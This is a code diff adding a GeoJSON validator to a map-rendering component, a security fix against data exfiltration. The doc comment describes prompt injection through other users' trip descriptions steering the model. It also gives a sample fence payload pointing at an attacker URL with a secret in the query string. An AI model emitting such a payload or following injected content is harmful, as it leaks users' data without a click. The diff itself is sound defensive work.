@@ -110,6 +110,39 @@ function geojsonPlugin(md) {
 function noImagesPlugin(md) {
     md.disable('image')
 }
+
+const GEOJSON_GEOMETRY_TYPES = [
+    'Point', 'MultiPoint', 'LineString', 'MultiLineString',
+    'Polygon', 'MultiPolygon', 'GeometryCollection',
+]
+const GEOJSON_TYPES = ['FeatureCollection', 'Feature', ...GEOJSON_GEOMETRY_TYPES]
+
+const isPlainObject = (v) => v !== null && typeof v === 'object' && !Array.isArray(v)
+
+/**
+ * Parses the body of a ```geojson fence and returns it only if it is an inline
+ * GeoJSON object; otherwise returns null.
+ *
+ * This is a security boundary, not just input hygiene: MapLibre's geojson source
+ * treats a string `data` value as a URL and fetches it the moment the map loads.
+ * The fence body is model output, and the model can be steered by prompt injection
+ * in content it reads (e.g. other users' trip descriptions), so a payload like
+ * ```geojson "https://attacker/?d=<secret>"``` would exfiltrate data on render
+ * with no click. Only plain objects with a known GeoJSON `type` are accepted.
+ */
+export function parseGeoJSON(raw) {
+    let value
+    try {
+        value = JSON.parse(raw)
+    } catch {
+        return null
+    }
+    if (!isPlainObject(value) || !GEOJSON_TYPES.includes(value.type)) return null
+    if (value.type === 'FeatureCollection'
+        && !(Array.isArray(value.features) && value.features.every(isPlainObject))) return null
+    if (value.type === 'Feature' && value.geometry !== null && !isPlainObject(value.geometry)) return null
+    return value
+}
 </script>
 
 <script setup>
@@ -271,10 +304,16 @@ const renderGeoJSONMaps = async () => {
         node.style.overflow = 'hidden'
         node.style.marginBottom = '1rem'
 
-        let geojson
+        let raw
         try {
-            geojson = JSON.parse(decodeURIComponent(node.getAttribute('data-geojson') || ''))
+            raw = decodeURIComponent(node.getAttribute('data-geojson') || '')
         } catch {
+            raw = ''
+        }
+        // Never hand MapLibre anything but an inline GeoJSON object: a string
+        // would be fetched as a URL (see parseGeoJSON).
+        const geojson = parseGeoJSON(raw)
+        if (!geojson) {
             node.innerHTML = '<div class="pa-4 text-error">Invalid GeoJSON</div>'
             continue
         }
@@ -360,7 +399,8 @@ const renderGeoJSONMaps = async () => {
             }
 
             if (geojson.type === 'FeatureCollection') geojson.features.forEach(f => collectCoords(f.geometry))
-            else if (geojson.geometry) collectCoords(geojson.geometry)
+            else if (geojson.type === 'Feature') collectCoords(geojson.geometry)
+            else collectCoords(geojson)
 
             if (coords.length === 1) {
                 map.flyTo({ center: coords[0], zoom: 11 })
